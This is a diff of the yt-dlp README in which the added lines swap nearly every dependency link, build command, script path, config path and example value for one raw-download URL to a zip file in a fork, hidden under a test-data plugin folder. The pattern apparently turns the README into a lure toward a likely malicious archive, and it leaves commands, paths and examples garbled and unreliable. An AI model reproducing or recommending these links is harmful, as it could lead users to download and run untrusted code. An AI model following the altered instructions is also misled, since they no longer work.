-* [**AtomicParsley**](https://github.com/wez/atomicparsley) - For `--embed-thumbnail` in `mp4`/`m4a` files when `mutagen`/`ffmpeg` cannot. Licensed under [GPLv2+](https://github.com/wez/atomicparsley/blob/master/COPYING)
-* [**xattr**](https://github.com/xattr/xattr), [**pyxattr**](https://github.com/iustin/pyxattr) or [**setfattr**](http://savannah.nongnu.org/projects/attr) - For writing xattr metadata (`--xattr`) on **Mac** and **BSD**. Licensed under [MIT](https://github.com/xattr/xattr/blob/master/LICENSE.txt), [LGPL2.1](https://github.com/iustin/pyxattr/blob/master/COPYING) and [GPLv2+](http://git.savannah.nongnu.org/cgit/attr.git/tree/doc/COPYING) respectively
+* [**mutagen**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - For `--embed-thumbnail` in certain formats. Licensed under [GPLv2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**AtomicParsley**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - For `--embed-thumbnail` in `mp4`/`m4a` files when `mutagen`/`ffmpeg` cannot. Licensed under [GPLv2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**xattr**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip), [**pyxattr**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or [**setfattr**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - For writing xattr metadata (`--xattr`) on **Mac** and **BSD**. Licensed under [MIT](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip), [LGPL2.1](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) and [GPLv2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) respectively
 
 ### Misc
 
-* [**pycryptodomex**](https://github.com/Legrandin/pycryptodome)\* - For decrypting AES-128 HLS streams and various other data. Licensed under [BSD-2-Clause](https://github.com/Legrandin/pycryptodome/blob/master/LICENSE.rst)
-* [**phantomjs**](https://github.com/ariya/phantomjs) - Used in extractors where javascript needs to be run. Licensed under [BSD-3-Clause](https://github.com/ariya/phantomjs/blob/master/LICENSE.BSD)
-* [**secretstorage**](https://github.com/mitya57/secretstorage)\* - For `--cookies-from-browser` to access the **Gnome** keyring while decrypting cookies of **Chromium**-based browsers on **Linux**. Licensed under [BSD-3-Clause](https://github.com/mitya57/secretstorage/blob/master/LICENSE)
+* [**pycryptodomex**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - For decrypting AES-128 HLS streams and various other data. Licensed under [BSD-2-Clause](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**phantomjs**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - Used in extractors where javascript needs to be run. Licensed under [BSD-3-Clause](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**secretstorage**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - For `--cookies-from-browser` to access the **Gnome** keyring while decrypting cookies of **Chromium**-based browsers on **Linux**. Licensed under [BSD-3-Clause](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 * Any external downloader that you want to use with `--downloader`
 
 ### Deprecated
 
-* [**avconv** and **avprobe**](https://www.libav.org) - Now **deprecated** alternative to ffmpeg. License [depends on the build](https://libav.org/legal)
-* [**sponskrub**](https://github.com/faissaloo/SponSkrub) - For using the now **deprecated** [sponskrub options](#sponskrub-options). Licensed under [GPLv3+](https://github.com/faissaloo/SponSkrub/blob/master/LICENCE.md)
-* [**rtmpdump**](http://rtmpdump.mplayerhq.hu) - For downloading `rtmp` streams. ffmpeg can be used instead with `--downloader ffmpeg`. Licensed under [GPLv2+](http://rtmpdump.mplayerhq.hu)
-* [**mplayer**](http://mplayerhq.hu/design7/info.html) or [**mpv**](https://mpv.io) - For downloading `rstp`/`mms` streams. ffmpeg can be used instead with `--downloader ffmpeg`. Licensed under [GPLv2+](https://github.com/mpv-player/mpv/blob/master/Copyright)
+* [**avconv** and **avprobe**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - Now **deprecated** alternative to ffmpeg. License [depends on the build](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**sponskrub**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - For using the now **deprecated** [sponskrub options](#sponskrub-options). Licensed under [GPLv3+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**rtmpdump**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - For downloading `rtmp` streams. ffmpeg can be used instead with `--downloader ffmpeg`. Licensed under [GPLv2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**mplayer**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or [**mpv**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - For downloading `rstp`/`mms` streams. ffmpeg can be used instead with `--downloader ffmpeg`. Licensed under [GPLv2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 To use or redistribute the dependencies, you must agree to their respective licensing terms.
 
@@ -238,18 +238,18 @@ To build the standalone executable, you must have Python and `pyinstaller` (plus
 You can run the following commands:
 
 ```
-python3 devscripts/install_deps.py --include pyinstaller
-python3 devscripts/make_lazy_extractors.py
-python3 -m bundle.pyinstaller
+python3 https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip --include pyinstaller
+python3 https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
+python3 -m https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
 ```
 
 On some systems, you may need to use `py` or `python` instead of `python3`.
 
-`python -m bundle.pyinstaller` accepts any arguments that can be passed to `pyinstaller`, such as `--onefile/-F` or `--onedir/-D`, which is further [documented here](https://pyinstaller.org/en/stable/usage.html#what-to-generate).
+`python -m https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` accepts any arguments that can be passed to `pyinstaller`, such as `--onefile/-F` or `--onedir/-D`, which is further [documented here](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip).
 
-**Note**: Pyinstaller versions below 4.4 [do not support](https://github.com/pyinstaller/pyinstaller#requirements-and-tested-platforms) Python installed from the Windows store without using a virtual environment.
+**Note**: Pyinstaller versions below 4.4 [do not support](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) Python installed from the Windows store without using a virtual environment.
 
-**Important**: Running `pyinstaller` directly **instead of** using `python -m bundle.pyinstaller` is **not** officially supported. This may or may not work correctly.
+**Important**: Running `pyinstaller` directly **instead of** using `python -m https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` is **not** officially supported. This may or may not work correctly.
 
 ### Platform-independent Binary (UNIX)
 You will need the build tools `python` (3.9+), `zip`, `make` (GNU), `pandoc`\* and `pytest`\*.
@@ -260,16 +260,16 @@ You can also run `make yt-dlp` instead to compile only the binary without updati
 
 ### Related scripts
 
-* **`devscripts/install_deps.py`** - Install dependencies for yt-dlp.
-* **`devscripts/update-version.py`** - Update the version number based on the current date.
-* **`devscripts/set-variant.py`** - Set the build variant of the executable.
-* **`devscripts/make_changelog.py`** - Create a markdown changelog using short commit messages and update `CONTRIBUTORS` file.
-* **`devscripts/make_lazy_extractors.py`** - Create lazy extractors. Running this before building the binaries (any variant) will improve their startup performance. Set the environment variable `YTDLP_NO_LAZY_EXTRACTORS` to something nonempty to forcefully disable lazy extractor loading.
+* **`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`** - Install dependencies for yt-dlp.
+* **`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`** - Update the version number based on the current date.
+* **`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`** - Set the build variant of the executable.
+* **`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`** - Create a markdown changelog using short commit messages and update `CONTRIBUTORS` file.
+* **`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`** - Create lazy extractors. Running this before building the binaries (any variant) will improve their startup performance. Set the environment variable `YTDLP_NO_LAZY_EXTRACTORS` to something nonempty to forcefully disable lazy extractor loading.
 
 Note: See their `--help` for more info.
 
 ### Forking the project
-If you fork the project on GitHub, you can run your fork's [build workflow](.github/workflows/build.yml) to automatically build the selected version(s) as artifacts. Alternatively, you can run the [release workflow](.github/workflows/release.yml) or enable the [nightly workflow](.github/workflows/release-nightly.yml) to create full (pre-)releases.
+If you fork the project on GitHub, you can run your fork's [build workflow](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) to automatically build the selected version(s) as artifacts. Alternatively, you can run the [release workflow](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or enable the [nightly workflow](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) to create full (pre-)releases.
 
 # USAGE AND OPTIONS
 
@@ -544,7 +544,7 @@ If you fork the project on GitHub, you can run your fork's [build workflow](.git
                                     --playlist-random and --playlist-reverse
     --no-lazy-playlist              Process videos in the playlist only after
                                     the entire playlist is parsed (default)
-    --xattr-set-filesize            Set file xattribute ytdl.filesize with
+    --xattr-set-filesize            Set file xattribute https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip with
                                     expected file size
     --hls-use-mpegts                Use the mpegts container for HLS videos;
                                     allowing some players to play the video
@@ -637,7 +637,7 @@ If you fork the project on GitHub, you can run your fork's [build workflow](.git
                                     the file modification time
     --write-description             Write video description to a .description file
     --no-write-description          Do not write video description (default)
-    --write-info-json               Write video metadata to a .info.json file
+    --write-info-json               Write video metadata to a https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip file
                                     (this may contain personal information)
     --no-write-info-json            Do not write video metadata (default)
     --write-playlist-metafiles      Write playlist metadata in addition to the
@@ -757,7 +757,7 @@ If you fork the project on GitHub, you can run your fork's [build workflow](.git
                                     "info" key and the progress attributes are
                                     accessible under "progress" key. E.g.
                                     --console-title --progress-template
-                                    "download-title:%(info.id)s-%(progress.eta)s"
+                                    "download-title:%(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)s-%(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)s"
     --progress-delta SECONDS        Time between progress output (default: 0)
     -v, --verbose                   Print various debugging information
     --dump-pages                    Print downloaded pages encoded using base64
@@ -858,7 +858,7 @@ If you fork the project on GitHub, you can run your fork's [build workflow](.git
     -n, --netrc                     Use .netrc authentication data
     --netrc-location PATH           Location of .netrc authentication data;
                                     either the path or its containing directory.
-                                    Defaults to ~/.netrc
+                                    Defaults to ~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
     --netrc-cmd NETRC_CMD           Command to execute to get the credentials
                                     for an extractor.
     --video-password PASSWORD       Video-specific password
@@ -1049,7 +1049,7 @@ If you fork the project on GitHub, you can run your fork's [build workflow](.git
 ## SponsorBlock Options:
 Make chapter entries for, or remove various segments (sponsor,
     introductions, etc.) from downloaded YouTube videos using the
-    [SponsorBlock API](https://sponsor.ajay.app)
+    [SponsorBlock API](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
     --sponsorblock-mark CATS        SponsorBlock categories to create chapters
                                     for, separated by commas. Available
@@ -1060,7 +1060,7 @@ Make chapter entries for, or remove various segments (sponsor,
                                     category with a "-" to exclude it. See [1]
                                     for descriptions of the categories. E.g.
                                     --sponsorblock-mark all,-preview
-                                    [1] https://wiki.sponsor.ajay.app/w/Segment_Categories
+                                    [1] https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
     --sponsorblock-remove CATS      SponsorBlock categories to be removed from
                                     the video file, separated by commas. If a
                                     category is present in both mark and remove,
@@ -1079,7 +1079,7 @@ Make chapter entries for, or remove various segments (sponsor,
     --no-sponsorblock               Disable both --sponsorblock-mark and
                                     --sponsorblock-remove
     --sponsorblock-api URL          SponsorBlock API location, defaults to
-                                    https://sponsor.ajay.app
+                                    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
 
 ## Extractor Options:
     --extractor-retries RETRIES     Number of retries for known extractor errors
@@ -1105,28 +1105,28 @@ You can configure yt-dlp by placing any supported command line option in a confi
 1. **Main Configuration**:
     * The file given to `--config-location`
 1. **Portable Configuration**: (Recommended for portable installations)
-    * If using a binary, `yt-dlp.conf` in the same directory as the binary
-    * If running from source-code, `yt-dlp.conf` in the parent directory of `yt_dlp`
+    * If using a binary, `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` in the same directory as the binary
+    * If running from source-code, `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` in the parent directory of `yt_dlp`
 1. **Home Configuration**:
-    * `yt-dlp.conf` in the home path given to `-P`
+    * `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` in the home path given to `-P`
     * If `-P` is not given, the current directory is searched
 1. **User Configuration**:
-    * `${XDG_CONFIG_HOME}/yt-dlp.conf`
+    * `${XDG_CONFIG_HOME}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
     * `${XDG_CONFIG_HOME}/yt-dlp/config` (recommended on Linux/macOS)
-    * `${XDG_CONFIG_HOME}/yt-dlp/config.txt`
-    * `${APPDATA}/yt-dlp.conf`
+    * `${XDG_CONFIG_HOME}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
+    * `${APPDATA}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
     * `${APPDATA}/yt-dlp/config` (recommended on Windows)
-    * `${APPDATA}/yt-dlp/config.txt`
-    * `~/yt-dlp.conf`
-    * `~/yt-dlp.conf.txt`
-    * `~/.yt-dlp/config`
-    * `~/.yt-dlp/config.txt`
+    * `${APPDATA}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
+    * `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
+    * `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
+    * `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
+    * `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 
     See also: [Notes about environment variables](#notes-about-environment-variables)
 1. **System Configuration**:
-    * `/etc/yt-dlp.conf`
+    * `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
     * `/etc/yt-dlp/config`
-    * `/etc/yt-dlp/config.txt`
+    * `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 
 E.g. with the following configuration file, yt-dlp will always extract the audio, not copy the mtime, use a proxy and save all videos under `YouTube` directory in your home directory:
 ```
@@ -1157,10 +1157,10 @@ If you want your file to be decoded differently, add `# coding: ENCODING` to the
 
 ### Authentication with netrc
 
-You may also want to configure automatic credentials storage for extractors that support authentication (by providing login and password with `--username` and `--password`) in order not to pass credentials as command line arguments on every yt-dlp execution and prevent tracking plain text passwords in the shell command history. You can achieve this using a [`.netrc` file](https://stackoverflow.com/tags/.netrc/info) on a per-extractor basis. For that, you will need to create a `.netrc` file in `--netrc-location` and restrict permissions to read/write by only you:
+You may also want to configure automatic credentials storage for extractors that support authentication (by providing login and password with `--username` and `--password`) in order not to pass credentials as command line arguments on every yt-dlp execution and prevent tracking plain text passwords in the shell command history. You can achieve this using a [`.netrc` file](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) on a per-extractor basis. For that, you will need to create a `.netrc` file in `--netrc-location` and restrict permissions to read/write by only you:
 ```
-touch ${HOME}/.netrc
-chmod a-rwx,u+rw ${HOME}/.netrc
+touch ${HOME}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
+chmod a-rwx,u+rw ${HOME}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
 ```
 After that, you can add credentials for an extractor in the following format, where *extractor* is the name of the extractor in lowercase:
 ```
@@ -1168,7 +1168,7 @@ machine <extractor> login <username> password <password>
 ```
 E.g.
 ```
-machine youtube login myaccount@gmail.com password my_youtube_password
+machine youtube login https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip password my_youtube_password
 machine twitch login my_twitch_account_name password my_twitch_password
 ```
 To activate authentication with the `.netrc` file you should pass `--netrc` to yt-dlp or place it in the [configuration file](#configuration).
@@ -1177,16 +1177,16 @@ The default location of the .netrc file is `~` (see below).
 
 As an alternative to using the `.netrc` file, which has the disadvantage of keeping your passwords in a plain text file, you can configure a custom shell command to provide the credentials for an extractor. This is done by providing the `--netrc-cmd` parameter, it shall output the credentials in the netrc format and return `0` on success, other values will be treated as an error. `{}` in the command will be replaced by the name of the extractor to make it possible to select the credentials for the right extractor.
 
-E.g. To use an encrypted `.netrc` file stored as `.authinfo.gpg`
+E.g. To use an encrypted `.netrc` file stored as `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 ```
-yt-dlp --netrc-cmd 'gpg --decrypt ~/.authinfo.gpg' 'https://www.youtube.com/watch?v=BaW_jenozKc'
+yt-dlp --netrc-cmd 'gpg --decrypt ~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip' 'https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip'
 ```
 
 
 ### Notes about environment variables
 * Environment variables are normally specified as `${VARIABLE}`/`$VARIABLE` on UNIX and `%VARIABLE%` on Windows; but is always shown as `${VARIABLE}` in this documentation
 * yt-dlp also allows using UNIX-style variables on Windows for path-like options; e.g. `--output`, `--config-location`
-* If unset, `${XDG_CONFIG_HOME}` defaults to `~/.config` and `${XDG_CACHE_HOME}` to `~/.cache`
+* If unset, `${XDG_CONFIG_HOME}` defaults to `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` and `${XDG_CACHE_HOME}` to `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 * On Windows, `~` points to `${HOME}` if present; or, `${USERPROFILE}` or `${HOMEDRIVE}${HOMEPATH}` otherwise
 * On Windows, `${USERPROFILE}` generally points to `C:\Users\<user name>` and `${APPDATA}` to `${USERPROFILE}\AppData\Roaming`
 
@@ -1198,27 +1198,27 @@ The `-o` option is used to indicate a template for the output file names while `
 **tl;dr:** [navigate me to examples](#output-template-examples).
 <!-- MANPAGE: END EXCLUDED SECTION -->
 
-The simplest usage of `-o` is not to set any template arguments when downloading a single file, like in `yt-dlp -o funny_video.flv "https://some/video"` (hard-coding file extension like this is _not_ recommended and could break some post-processing).
+The simplest usage of `-o` is not to set any template arguments when downloading a single file, like in `yt-dlp -o https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "https://some/video"` (hard-coding file extension like this is _not_ recommended and could break some post-processing).
 
-It may however also contain special sequences that will be replaced when downloading each video. The special sequences may be formatted according to [Python string formatting operations](https://docs.python.org/3/library/stdtypes.html#printf-style-string-formatting), e.g. `%(NAME)s` or `%(NAME)05d`. To clarify, that is a percent symbol followed by a name in parentheses, followed by formatting operations.
+It may however also contain special sequences that will be replaced when downloading each video. The special sequences may be formatted according to [Python string formatting operations](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip), e.g. `%(NAME)s` or `%(NAME)05d`. To clarify, that is a percent symbol followed by a name in parentheses, followed by formatting operations.
 
 The field names themselves (the part inside the parenthesis) can also have some special formatting:
 
-1. **Object traversal**: The dictionaries and lists available in metadata can be traversed by using a dot `.` separator; e.g. `%(tags.0)s`, `%(subtitles.en.-1.ext)s`. You can do Python slicing with colon `:`; E.g. `%(id.3:7)s`, `%(id.6:2:-1)s`, `%(formats.:.format_id)s`. Curly braces `{}` can be used to build dictionaries with only specific keys; e.g. `%(formats.:.{format_id,height})#j`. An empty field name `%()s` refers to the entire infodict; e.g. `%(.{id,title})s`. Note that all the fields that become available using this method are not listed below. Use `-j` to see such fields
+1. **Object traversal**: The dictionaries and lists available in metadata can be traversed by using a dot `.` separator; e.g. `%(tags.0)s`, `%(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)s`. You can do Python slicing with colon `:`; E.g. `%(id.3:7)s`, `%(id.6:2:-1)s`, `%(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)s`. Curly braces `{}` can be used to build dictionaries with only specific keys; e.g. `%(formats.:.{format_id,height})#j`. An empty field name `%()s` refers to the entire infodict; e.g. `%(.{id,title})s`. Note that all the fields that become available using this method are not listed below. Use `-j` to see such fields
 
 1. **Arithmetic**: Simple arithmetic can be done on numeric fields using `+`, `-` and `*`. E.g. `%(playlist_index+10)03d`, `%(n_entries+1-playlist_index)d`
 
-1. **Date/time Formatting**: Date/time fields can be formatted according to [strftime formatting](https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes) by specifying it separated from the field name using a `>`. E.g. `%(duration>%H-%M-%S)s`, `%(upload_date>%Y-%m-%d)s`, `%(epoch-3600>%H-%M-%S)s`
+1. **Date/time Formatting**: Date/time fields can be formatted according to [strftime formatting](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) by specifying it separated from the field name using a `>`. E.g. `%(duration>%H-%M-%S)s`, `%(upload_date>%Y-%m-%d)s`, `%(epoch-3600>%H-%M-%S)s`
 
 1. **Alternatives**: Alternate fields can be specified separated with a `,`. E.g. `%(release_date>%Y,upload_date>%Y|Unknown)s`
 
-1. **Replacement**: A replacement value can be specified using a `&` separator according to the [`str.format` mini-language](https://docs.python.org/3/library/string.html#format-specification-mini-language). If the field is *not* empty, this replacement value will be used instead of the actual field content. This is done after alternate fields are considered; thus the replacement is used if *any* of the alternative fields is *not* empty. E.g. `%(chapters&has chapters|no chapters)s`, `%(title&TITLE={:>20}|NO TITLE)s`
+1. **Replacement**: A replacement value can be specified using a `&` separator according to the [`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` mini-language](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). If the field is *not* empty, this replacement value will be used instead of the actual field content. This is done after alternate fields are considered; thus the replacement is used if *any* of the alternative fields is *not* empty. E.g. `%(chapters&has chapters|no chapters)s`, `%(title&TITLE={:>20}|NO TITLE)s`
 
 1. **Default**: A literal default value can be specified for when the field is empty using a `|` separator. This overrides `--output-na-placeholder`. E.g. `%(uploader|Unknown)s`
 
 1. **More Conversions**: In addition to the normal format types `diouxXeEfFgGcrs`, yt-dlp additionally supports converting to `B` = **B**ytes, `j` = **j**son (flag `#` for pretty-printing, `+` for Unicode), `h` = HTML escaping, `l` = a comma separated **l**ist (flag `#` for `\n` newline-separated), `q` = a string **q**uoted for the terminal (flag `#` to split a list into different arguments), `D` = add **D**ecimal suffixes (e.g. 10M) (flag `#` to use 1024 as factor), and `S` = **S**anitize as filename (flag `#` for restricted)
 
-1. **Unicode normalization**: The format type `U` can be used for NFC [Unicode normalization](https://docs.python.org/3/library/unicodedata.html#unicodedata.normalize). The alternate form flag (`#`) changes the normalization to NFD and the conversion flag `+` can be used for NFKC/NFKD compatibility equivalence normalization. E.g. `%(title)+.100U` is NFKC
+1. **Unicode normalization**: The format type `U` can be used for NFC [Unicode normalization](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). The alternate form flag (`#`) changes the normalization to NFD and the conversion flag `+` can be used for NFKC/NFKD compatibility equivalence normalization. E.g. `%(title)+.100U` is NFKC
 
 To summarize, the general syntax for a field is:
 ```
@@ -1362,19 +1362,19 @@ Available only in `--sponsorblock-chapter-title`:
 
  - `start_time` (numeric): Start time of the chapter in seconds
  - `end_time` (numeric): End time of the chapter in seconds
